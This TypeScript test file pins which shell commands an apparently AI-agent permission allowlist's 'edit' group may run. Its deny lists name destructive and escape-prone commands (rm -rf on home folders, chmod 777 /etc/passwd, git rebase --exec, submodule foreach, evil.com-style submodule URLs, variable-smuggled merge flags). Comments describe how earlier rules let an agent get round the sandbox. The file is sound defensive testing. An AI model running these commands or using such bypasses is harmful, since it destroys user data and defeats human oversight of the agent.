import { describe, it, expect } from 'vitest';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Allowlist, type AllowlistConfig } from '../../src/permissions/allowlist.js';
import { validateGroupUpdate } from '../../src/routes/meta.js';
import type { PermissionGroupMap } from '../../src/actions/types.js';
import groupsJson from '../../config/permission-groups.default.json' with { type: 'json' };

const groups = groupsJson as unknown as PermissionGroupMap;

// The final whole-branch review of Ship 5 found that `edit`'s git verb rule — untouched by
// every earlier round of this ship — reopened both holes the ship closed through a different
// door: `git rebase --exec`/`-x` is `node -e` with a different spelling, and `git apply
// --unsafe-paths --directory=` writes anywhere with no interpreter at all. `git -C <path>`
// applied every destructive verb to any repo on the machine, not just the session's own. This
// file is the regression net: it pins the whole DENY list exhaustively, not sampled, because a
// sampled net is exactly what let `git rebase --exec` live through the whole ship undetected.
function editGroupChecker(): AllowlistConfig {
  const merged: AllowlistConfig = {
    alwaysAllow: [], alwaysAllowBashPatterns: [], alwaysAllowMcpPatterns: [], alwaysAllowPathPatterns: [],
  };
  for (const name of ['core', 'read', 'edit'] as const) {
    const g = groups[name] as AllowlistConfig;
    for (const x of g.alwaysAllow) merged.alwaysAllow.push(x);
    for (const x of g.alwaysAllowBashPatterns) merged.alwaysAllowBashPatterns.push(x);
    for (const x of g.alwaysAllowMcpPatterns) merged.alwaysAllowMcpPatterns.push(x);
    for (const x of g.alwaysAllowPathPatterns ?? []) merged.alwaysAllowPathPatterns!.push(x);
  }
  return merged;
}

const al = new Allowlist(editGroupChecker());
const wt = mkdtempSync(join(tmpdir(), 'edit-ceiling-wt-'));
const allows = (command: string) => al.allows('Bash', { command }, undefined, undefined, wt, undefined);

describe('the edit group git rule is an anchored whitelist, not a verb prefix', () => {
  it('denies every rebase/apply/-C/interpreter/file-op shape the whole-branch review found', () => {
    for (const c of [
      // CRITICAL 1 — git rebase --exec / -x is node -e with a different spelling.
      "git rebase --exec 'touch /x' HEAD~1",
      "git rebase -x 'sh -c evil' HEAD~1",
      // CRITICAL 2 — git apply writes anywhere, with no interpreter. Not enumerated at all —
      // no SKILL.md instructs it.
      'git apply --unsafe-paths --directory=/Users/x p.patch',
      // IMPORTANT 3 — the free -C <path> prefix applied every destructive verb to any repo on
      // the machine. Dropped entirely, so every -C form denies regardless of the verb.
      'git -C /Users/x/other clean -xdf',
      'git -C /Users/x/other reset --hard',
      'git -C /Users/x/other rm -r .',
      // Every git verb dropped for lack of evidence in the four edit-inheriting SKILL.mds.
      'git reset --hard',
      'git reset --hard HEAD~1',
      'git restore --staged .',
      'git cherry-pick abc123',
      'git revert HEAD',
      'git clean -xdf',
      'git switch main',
      'git stash',
      'git stash pop',
      'git mv a b',
      'git rm -r .',
      'git rm --cached a',
      // Direct interpreters — Ship 5 closed these; this file re-pins them from the edit side.
      'node -e "x"',
      'tsx -e "x"',
      'go run ./x',
      'npx cowsay',
      'make build',
      'mage t',
      'python3 -c "x"',
      'docker run -v /:/host alpine sh',
      // Unscoped file ops reaching outside the worktree.
      'cp /wt/a /Users/x/.zshrc',
      'rm -rf /Users/x/Documents',
      'chmod 777 /etc/passwd',
      'touch /Users/x/.zshrc',
      'rmdir /Users/x/d',
    ]) expect(allows(c), c).toBe(false);
  });

  it('allows every git invocation the four edit-inheriting SKILL.mds actually instruct', () => {
    for (const c of [
      // code.implement: worktree-drift resync (Failure modes), a bare ref, no flags.
      'git rebase origin/main',
      // code.implement: reverting an off-target file after self-review (Step 3).
      'git checkout -- src/foo.ts',
      'git checkout -- src/foo.ts src/bar.ts',
      // code.fix-ci: staging the fix before drafting the commit (Step 3).
      'git add -A',
      // code.resolve-conflicts: merging the base branch, and aborting an unresolvable one.
      'git merge origin/main',
      'git merge some-other-branch',
      'git merge --abort',
      // code.resolve-conflicts: staging each resolved file (Step 2).
      'git add path/to/resolved-file.go',
    ]) expect(allows(c), c).toBe(true);
  });

  it('allows the rest of the evidenced build/test long tail unaffected by the git rewrite', () => {
    for (const c of [
      'npm test',
      'npx tsc --noEmit',
      `rm -rf ${wt}/build`,
      'mkdir /tmp/x',
    ]) expect(allows(c), c).toBe(true);
  });

  it('validateGroupUpdate still accepts the rewritten edit group', () => {
    const r = validateGroupUpdate('edit', groups.edit!);
    expect(r.ok === false ? r.error : 'ok').toBe('ok');
  });

  // Three steps of one job dead-ended on a submodule bump with no executable path — every
  // mechanism denied. The grant deliberately does NOT reintroduce `-C`: a pin moves via
  // `update-index --cacheinfo` from the superproject root, so the no-`-C` invariant above stands.
  it('confines the submodule grant to the two operations a bump needs', () => {
    for (const c of [
      // Populate, and re-sync the working tree after the pin moved.
      'git submodule update --init',
      'git submodule update --init protocol',
      'git submodule update --init livekit-protocol/protocol',
      'git submodule update --init --recursive',
      'git submodule update protocol',
      'git submodule update --force --checkout yuv-sys/libyuv',
      // Move the gitlink, which is all a bump is.
      'git update-index --add --cacheinfo 160000,9a7c5cf96bbbcbc30a8ce76bca16815ba5b7bb33,protocol',
      'git update-index --cacheinfo 160000,9a7c5cf96bbbcbc30a8ce76bca16815ba5b7bb33,protocol',
      'git update-index --add --cacheinfo 160000 9a7c5cf96bbbcbc30a8ce76bca16815ba5b7bb33 protocol',
    ]) expect(allows(c), c).toBe(true);
  });

  it('denies every other submodule and update-index shape', () => {
    for (const c of [
      // `foreach` is an interpreter wearing a git verb, and `add` clones an arbitrary URL.
      "git submodule foreach 'rm -rf /'",
      'git submodule foreach git clean -xdf',
      'git submodule add https://evil/x.git vendor',
      'git submodule deinit --all --force',
      'git submodule set-url protocol https://evil/x.git',
      // `--reference` takes a path outside the worktree and links its objects in as alternates.
      'git submodule update --init --reference /Users/x/other protocol',
      // No `-C`, same as every other verb in this group.
      'git -C /Users/x/other submodule update --init',
      // A dotted operand can't be a submodule path; `..` traversal is off the table by charset.
      'git submodule update --init ../../../etc',
      // THE bar on update-index: mode 160000 is a gitlink. Any other mode stages arbitrary blob
      // content, which is a write to the tree that never went through Edit/Write's path scoping.
      'git update-index --add --cacheinfo 100644,9a7c5cf96bbbcbc30a8ce76bca16815ba5b7bb33,secret.env',
      'git update-index --add --cacheinfo 120000,9a7c5cf96bbbcbc30a8ce76bca16815ba5b7bb33,link',
      // Every other update-index mode, none of which any SKILL.md instructs.
      'git update-index --index-info',
      'git update-index --force-remove src/foo.ts',
      'git update-index --assume-unchanged src/foo.ts',
      'git update-index --skip-worktree src/foo.ts',
      'git update-index --refresh',
      'git update-index --chmod=+x src/foo.ts',
      // A non-hex sha would have to be an expansion or a flag; neither belongs here.
      'git update-index --add --cacheinfo 160000,$SHA,protocol',
    ]) expect(allows(c), c).toBe(false);
  });

  // Re-review, round 2: `add`'s repeated-token group had no first-character constraint, so
  // any flag built from [A-Za-z0-9_./-] passed straight through — `-f` bypasses .gitignore
  // (live-tested: stages a gitignored file), `-p`/`-i`/`-e`/`-u`/`-n`/`--renormalize` all
  // reached interactive/rewriting modes no SKILL.md uses. `merge -s ours`/`-X theirs` and
  // `--no-verify` were never reachable through the group rule itself (that always required a
  // bare ref or `--abort`) — they leaked only through the colocated `^git merge(\s|$)` extra
  // removed from fix-ci/resolve-conflicts below, but are pinned here too since this file is
  // the ceiling's regression net regardless of which layer would have let them through.
  it('does not let git add or git merge take a flag disguised as an operand', () => {
    for (const c of [
      'git add -f secret.env',
      'git add -p',
      'git add -i',
      'git add -e',
      'git add -u',
      'git add -n',
      'git add --renormalize',
      'git merge -s ours',
      'git merge -X theirs',
      'git merge --no-verify',
    ]) expect(allows(c), c).toBe(false);
  });

  it('git add still stages plain paths after the charset fix', () => {
    for (const c of [
      'git add -A',
      'git add .',
      'git add src/foo.ts',
      'git add a b',
    ]) expect(allows(c), c).toBe(true);
  });

  it('git merge still takes a bare ref or --abort after the charset fix', () => {
    for (const c of [
      'git merge origin/main',
      'git merge --abort',
    ]) expect(allows(c), c).toBe(true);
  });

  // Re-review, round 3: a rule was briefly widened to also accept a quoted shell variable
  // (`"$BASE"`) so code.resolve-conflicts's old SKILL.md text could stay unchanged. Live
  // testing showed that was the actual hole, not a narrower version of it — bash quoting
  // stops word-splitting, not git's own flag recognition, so `BASE="-s ours"` (or
  // `--no-verify`, `-Xtheirs`) reaches `git merge` as an option every bit as much unquoted
  // as quoted. `boundNote` can set `BASE` to anything, so it is not a trusted constant. The
  // fix is in the SKILL.md, not the allowlist: the base ref is now written literally into
  // the command, never carried through a variable, so nothing the allowlist cannot see ever
  // reaches `git merge`. These pin that no variable form is reachable, quoted or not.
  it('never accepts a shell variable as the merge ref, quoted or bare', () => {
    for (const c of [
      'git merge "$BASE"',
      "git merge '$BASE'",
      'git merge $BASE',
    ]) expect(allows(c), c).toBe(false);
  });
});
